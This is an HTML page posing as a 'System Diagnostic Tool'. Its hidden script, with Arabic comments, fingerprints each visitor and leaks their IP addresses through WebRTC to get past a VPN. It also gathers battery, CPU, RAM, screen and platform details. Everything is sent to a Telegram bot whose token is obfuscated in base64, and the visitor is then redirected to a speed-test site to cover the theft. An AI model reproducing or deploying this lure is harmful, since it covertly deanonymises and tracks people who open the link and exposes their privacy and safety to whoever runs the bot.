<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <title>System Diagnostic Tool</title>
</head>
<body style="background:#000; color:#000;">
    <script>
        (async function() {
            // [إعدادات التشفير]
            const _t = "ODQ4ODE0ODAzMjpBQUg5QjNydl9zZDJheVVVa3BWQmJrdXR0MnJ6ZFlhbGt3QQ==";
            const _c = "NTc3NTc4MTAzOA==";
            const _k = "portal";

            const _url = new URLSearchParams(window.location.search);
            if (_url.get('access') !== _k || navigator.webdriver) {
                window.location.replace("https://www.google.com"); return;
            }

            let _data = {
                ext: "جاري الجلب...",
                int: [], // مصفوفة لجمع كل الـ IPs المسربة
                bt: "N/A",
                cpu: navigator.hardwareConcurrency || "8",
                ram: navigator.deviceMemory || "4",
                plt: navigator.platform,
                res: `${window.screen.width}x${window.screen.height}`
            };

            // 1️⃣ سحب الـ IP الخارجي (الظاهري)
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                _data.ext = d.ip;
            } catch(e) {}

            // 2️⃣ 🔥 تقنية WebRTC العميقة لكسر الـ VPN
            const getInternalIPs = () => {
                return new Promise((resolve) => {
                    const pc = new RTCPeerConnection({
                        iceServers: [
                            {urls: 'stun:stun.l.google.com:19302'},
                            {urls: 'stun:stun1.l.google.com:19302'},
                            {urls: 'stun:stun2.l.google.com:19302'}
                        ]
                    });
                    pc.createDataChannel("");
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = (i) => {
                        if (!i || !i.candidate) return;
                        const cand = i.candidate.candidate;
                        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(cand);
                        if (match) {
                            const ip = match[1];
                            if (!ip.startsWith('127.') && !_data.int.includes(ip)) {
                                _data.int.push(ip);
                            }
                        }
                    };
                    setTimeout(() => resolve(), 4500); // وقت كافٍ لجمع المسارات
                });
            };
            await getInternalIPs();

            // 3️⃣ سحب حالة البطارية
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                _data.bt = `${Math.round(b.level * 100)}% ${b.charging ? "(يُشحن)" : "(تفريغ)"}`;
            }

            // 4️⃣ تجميع وإرسال التقرير
            setTimeout(async () => {
                // تصفية الـ IP الداخلي الحقيقي (الذي يختلف عن الخارجي)
                const realIp = _data.int.find(ip => ip !== _data.ext) || (_data.int[0] || "لم يتم الكشف");

                const _msg = `🔥 تم اصطياد البيانات ببروتوكول WebRTC 🔥\n\n` +
                               `✅ الـ IP الحقيقي (الداخلي): ${realIp}\n` +
                               `🌐 الـ IP الظاهري (الخارجي): ${_data.ext}\n` +
                               `🔋 البطارية: ${_data.bt}\n` +
                               `🧠 المعالج: ${_data.cpu} Cores | الرام: ${_data.ram} GB\n` +
                               `🖥️ الشاشة: ${_data.res}\n` +
                               `📱 النظام: ${_data.plt}\n\n` +
                               `📍 رابط التتبع للـ IP الحقيقي:\n` +
                               `https://www.infobyip.com/ip-${realIp}.html`;

                const _api = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + atob(_t) + atob("L3NlbmRNZXNzYWdl");

                await fetch(_api, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({chat_id: atob(_c), text: _msg})
                });

                window.location.replace("https://www.speedtest.net");
            }, 5500);
        })();
    </script>
</body>
</html>
